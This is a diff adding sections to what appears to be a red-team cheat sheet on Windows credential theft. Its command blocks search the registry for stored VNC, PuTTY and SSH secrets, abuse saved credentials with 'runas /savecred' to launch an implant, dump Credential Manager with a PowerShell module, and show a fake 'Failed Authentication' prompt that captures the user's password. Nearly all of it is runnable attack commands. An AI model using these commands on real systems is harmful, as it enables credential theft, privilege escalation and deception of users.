@@ -35,6 +35,39 @@ C:\> type c:\rto\c-dirs.txt | findstr /i vnc
   - gcloud\credentials.db
   - gcloud\legacy_credentials
   - gcloud\access_tokens.db
+ 
+- Search for passwords in the Registry
+
+```
+C:\> reg query "HKCU\Software\ORL\WinVNC3\Password"
+C:\> reg query "HKCU\Software\TightVNC\Server"
+C:\> reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
+C:\> reg query "HKCU\Software\OpenSSH\Agent\Keys"
+C:\> reg query HKLM /f password /t REG_SZ /s
+C:\> reg query HKCU /f password /t REG_SZ /s
+```
+
+- Abuse Credential Manager
+
+```
+C:\> cmdkey /list
+C:\> runas /savecred /user:admin cmd.exe
+C:\> runas /savecred /user:admin c:\rto\lpe\implant\implant.exe
+C:\> runas /savecred /user:admin "c:\windows\system32\cmd /c dir /b /a /s c:\users\admin > c:\rto\admin.txt"
+```
+
+- Rob Credential Manager
+
+```
+C:\> powershell Import-Module c:\rto\lpe\cms.ps1 ; Enum-Creds
+```
+
+- Ask user for credentials using a trick prompt
+
+```
+C:\> powershell "$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password"
+C:\> powershell "$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'admin',[Environment]::UserDomainName); $cred.getnetworkcredential().password"
+```
 
 ### Unsecured Objects
 
